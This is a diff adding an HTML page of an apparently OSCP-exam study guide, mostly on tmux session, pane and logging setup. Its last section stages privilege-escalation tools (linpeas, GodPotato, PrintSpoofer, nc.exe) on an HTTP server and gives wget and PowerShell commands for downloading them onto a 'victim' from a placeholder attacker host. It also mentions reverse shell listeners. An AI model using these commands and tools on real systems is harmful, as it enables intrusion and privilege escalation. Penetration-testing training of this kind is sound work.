@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>TMUX Exam Setup | Psalm OSCP</title>
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --card: #161b22;
+      --code-bg: #10151e;
+      --border: #21262d;
+      --border2: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --dim: #6e7681;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --yellow: #d29922;
+      --red: #f85149;
+      --purple: #bc8cff;
+      --mono: 'Courier New', Courier, monospace;
+      --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.6; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* NAV */
+    .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 0.85rem 2rem; background: var(--bg2); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+    .logo { font-family: var(--mono); font-size: 1.05rem; color: var(--accent); font-weight: 700; }
+    .back-link { font-size: 0.82rem; color: var(--muted); border: 1px solid var(--border2); padding: 4px 12px; border-radius: 6px; transition: all 0.2s; }
+    .back-link:hover { background: var(--card); color: var(--text); text-decoration: none; }
+
+    /* LAYOUT */
+    .page { display: flex; max-width: 1380px; margin: 0 auto; }
+
+    /* SIDEBAR */
+    .sidebar { width: 230px; flex-shrink: 0; padding: 2rem 1rem 2rem 1.5rem; position: sticky; top: 54px; height: calc(100vh - 54px); overflow-y: auto; border-right: 1px solid var(--border); }
+    .sidebar-label { font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--dim); margin-bottom: 0.6rem; padding-bottom: 0.3rem; border-bottom: 1px solid var(--border); }
+    .sidebar ul { list-style: none; }
+    .sidebar li { margin-bottom: 1px; }
+    .sidebar li a { display: block; font-size: 0.8rem; color: var(--muted); padding: 4px 8px; border-radius: 4px; font-family: var(--mono); transition: all 0.15s; }
+    .sidebar li a:hover { background: var(--card); color: var(--accent); text-decoration: none; }
+    .sidebar-group { margin-top: 1.1rem; }
+    .sidebar-group-lbl { font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--dim); padding: 2px 8px; margin-bottom: 2px; display: block; }
+
+    /* MAIN */
+    .main { flex: 1; padding: 2rem 2.5rem 5rem; min-width: 0; }
+    .page-title { font-size: 1.9rem; font-weight: 700; margin-bottom: 0.4rem; }
+    .page-sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 2.5rem; }
+
+    /* SECTIONS */
+    .sec { margin-bottom: 3rem; }
+    .sec-head { display: flex; align-items: center; gap: 10px; margin-bottom: 1.2rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    .sec-head h2 { font-size: 1.2rem; font-weight: 600; }
+
+    /* CODE BLOCKS */
+    .cb { margin: 0.75rem 0; border: 1px solid var(--border2); border-radius: 8px; overflow: hidden; }
+    .cb-head { display: flex; align-items: center; justify-content: space-between; padding: 5px 13px; background: var(--card); border-bottom: 1px solid var(--border); gap: 8px; flex-wrap: wrap; }
+    .cb-lbl { font-size: 0.73rem; font-family: var(--mono); color: var(--muted); }
+    .cb-tags { display: flex; gap: 5px; margin-left: auto; }
+    .tag { font-size: 0.65rem; padding: 1px 7px; border-radius: 4px; font-family: var(--mono); border: 1px solid var(--border2); color: var(--dim); }
+    .t-your { border-color: #d2992255; color: var(--yellow); background: #d2992212; }
+    .t-crit { border-color: #f8514955; color: var(--red); background: #f8514912; }
+    .t-win  { border-color: #58a6ff55; color: var(--accent); background: #58a6ff12; }
+    .t-lin  { border-color: #3fb95055; color: var(--green); background: #3fb95012; }
+    .t-ad   { border-color: #bc8cff55; color: var(--purple); background: #bc8cff12; }
+    .cpb { font-size: 0.68rem; padding: 2px 9px; background: transparent; border: 1px solid var(--border2); border-radius: 4px; color: var(--dim); cursor: pointer; font-family: var(--mono); white-space: nowrap; transition: all 0.15s; }
+    .cpb:hover { background: var(--code-bg); color: var(--muted); }
+    pre { background: var(--code-bg); padding: 12px 15px; font-family: var(--mono); font-size: 0.8rem; line-height: 1.85; overflow-x: auto; color: var(--text); white-space: pre; }
+    .c  { color: var(--dim); }
+    .h  { color: var(--green); }
+    .w  { color: var(--yellow); }
+    .e  { color: var(--red); }
+
+    /* CALLOUTS */
+    .note  { padding: 9px 13px; border-radius: 6px; margin: 0.6rem 0; font-size: 0.83rem; line-height: 1.6; font-family: var(--mono); }
+    .n-info  { background: #1f6feb14; border: 1px solid #1f6feb44; color: #58a6ff; }
+    .n-warn  { background: #d2992214; border: 1px solid #d2992244; color: var(--yellow); }
+    .n-bad   { background: #f8514914; border: 1px solid #f8514944; color: var(--red); }
+    .n-good  { background: #3fb95014; border: 1px solid #3fb95044; color: var(--green); }
+
+    /* SIGNAL BOX */
+    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.95; }
+    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 7px; display: block; }
+    .so { color: var(--muted); }
+    .sa { color: var(--green); }
+
+    /* GRID */
+    .two { display: grid; grid-template-columns: 1fr 1fr; gap: 0.9rem; }
+    @media(max-width:880px) { .sidebar{display:none;} .main{padding:1.2rem;} .two{grid-template-columns:1fr;} }
+
+    /* FOOTER */
+    footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
+
+    /* COPY JS */
+  </style>
+  <script>
+    function cp(btn) {
+      const pre = btn.closest('.cb').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const o = btn.textContent; btn.textContent = '✓ copied';
+        setTimeout(() => btn.textContent = o, 1500);
+      });
+    }
+  </script>
+</head>
+<body>
+<nav class="top-nav">
+  <a class="logo" href="https://difficultsnow.github.io/PT-toolkit-main/index.html">&lt;DifficultSnow/&gt;</a>
+  <a class="back-link" href="index.html">← Psalm OSCP Methodology</a>
+</nav>
+<div class="page">
+  <aside class="sidebar">
+    <div class="sidebar-label">On This Page</div>
+    <ul>
+      <li><a href="#session">Session Setup</a></li>
+      <li><a href="#panes">Pane Layout</a></li>
+      <li><a href="#nav">Navigation</a></li>
+      <li><a href="#scroll">Scroll &amp; Logging</a></li>
+      <li><a href="#tools">Pre-exam Prep</a></li>
+    </ul>
+  </aside>
+  <main class="main">
+    <h1 class="page-title">⌨️ TMUX Exam Setup</h1>
+    <p class="page-sub">Do this before touching a single target. One named window per machine. Never lose output.</p>
+
+    <section class="sec" id="session">
+      <div class="sec-head"><h2>Session + Window Layout</h2></div>
+      <div class="note n-warn">Start this immediately when the exam VPN connects. Do NOT touch any target until all windows are named and scans are queued.</div>
+      <div class="cb">
+        <div class="cb-head"><span class="cb-lbl">create session + recommended window layout</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>tmux new-session -s oscp
+
+<span class="c"># Rename current window:  Ctrl+b ,  → type name → Enter</span>
+<span class="c"># New window:             Ctrl+b c</span>
+<span class="c"># Rename it:              Ctrl+b ,</span>
+
+<span class="c"># Recommended layout:</span>
+<span class="c"># 0: notes      IPs, creds found, running status per target</span>
+<span class="c"># 1: scans      all background nmap jobs (&amp;)</span>
+<span class="c"># 2: http       python3 -m http.server 8080 (NEVER close this)</span>
+<span class="c"># 3: listeners  all nc/pwncat reverse shell listeners</span>
+<span class="c"># 4: dc01       AD machine 1</span>
+<span class="c"># 5: dc02       AD machine 2</span>
+<span class="c"># 6: dc03       AD DC (main Domain Controller)</span>
+<span class="c"># 7: web01      standalone 1</span>
+<span class="c"># 8: lin01      standalone 2</span>
+<span class="c"># 9: win01      standalone 3</span></pre>
+      </div>
+    </section>
+
+    <section class="sec" id="panes">
+      <div class="sec-head"><h2>Pane Splits</h2></div>
+      <div class="cb">
+        <div class="cb-head"><span class="cb-lbl">split panes inside each machine window</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Vertical split (left | right):</span>
+Ctrl+b %
+
+<span class="c"># Horizontal split (top / bottom):</span>
+Ctrl+b "
+
+<span class="c"># Move between panes:</span>
+Ctrl+b arrow-key
+
+<span class="c"># Zoom pane fullscreen (toggle):</span>
+Ctrl+b z
+
+<span class="c"># Recommended per machine window:</span>
+<span class="c"># LEFT pane  → active shell / exploitation</span>
+<span class="c"># RIGHT pane → enumeration output / notes</span></pre>
+      </div>
+    </section>
+
+    <section class="sec" id="nav">
+      <div class="sec-head"><h2>Navigation</h2></div>
+      <div class="cb">
+        <div class="cb-head"><span class="cb-lbl">window and session commands</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>Ctrl+b 0-9       <span class="c"># jump directly to window number</span>
+Ctrl+b n         <span class="c"># next window</span>
+Ctrl+b p         <span class="c"># previous window</span>
+Ctrl+b w         <span class="c"># visual window picker</span>
+Ctrl+b d         <span class="c"># detach session</span>
+tmux attach -t oscp   <span class="c"># reattach</span></pre>
+      </div>
+    </section>
+
+    <section class="sec" id="scroll">
+      <div class="sec-head"><h2>Scroll Mode &amp; Logging</h2></div>
+      <div class="cb">
+        <div class="cb-head"><span class="cb-lbl">scroll through output</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>Ctrl+b [         <span class="c"># enter scroll/copy mode</span>
+q                <span class="c"># exit scroll mode</span>
+/                <span class="c"># search (n = next match)</span>
+PgUp / PgDn      <span class="c"># scroll pages</span></pre>
+      </div>
+      <div class="cb">
+        <div class="cb-head"><span class="cb-lbl">log all output to file (run once per window)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># In the window you want to log:</span>
+Ctrl+b :
+pipe-pane -o "cat >> ~/exam/logs/tmux_$(tmux display-message -p '#W').log"
+
+<span class="c"># Toggle off:</span>
+Ctrl+b :
+pipe-pane</pre>
+      </div>
+    </section>
+
+    <section class="sec" id="tools">
+      <div class="sec-head"><h2>Pre-Exam Tool Prep</h2></div>
+      <div class="note n-info">Stage all tools in ~/exam/serve/ before exam day. The http server serves them to victims instantly.</div>
+      <div class="cb">
+        <div class="cb-head"><span class="cb-lbl">stage tools + start http server (window 2: http)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>mkdir -p ~/exam/serve && cd ~/exam/serve
+
+<span class="c"># Copy tools here before exam (adjust paths to your Kali):</span>
+cp /usr/share/peass/linpeas.sh .
+cp /usr/share/peass/winPEAS/winPEASx64.exe .
+cp /opt/pspy/pspy64 .
+cp /opt/ligolo-ng/agent .
+cp /opt/ligolo-ng/agent.exe .
+cp /opt/GodPotato/GodPotato-NET4.exe .
+cp /opt/PrintSpoofer/PrintSpoofer64.exe .
+cp /usr/share/windows-resources/binaries/nc.exe .
+
+<span class="c"># Start server — never close this window:</span>
+python3 -m http.server 8080
+
+<span class="c"># Victim Linux downloads:   wget http://&lt;KALI&gt;:8080/linpeas.sh</span>
+<span class="c"># Victim Windows downloads:  (New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/wp.exe','C:\Temp\wp.exe')</span></pre>
+      </div>
+    </section>
+
+  </main>
+</div>
+<footer>&lt;DifficultSnow/&gt; | Psalm OSCP Methodology</footer>
+</body>
+</html>
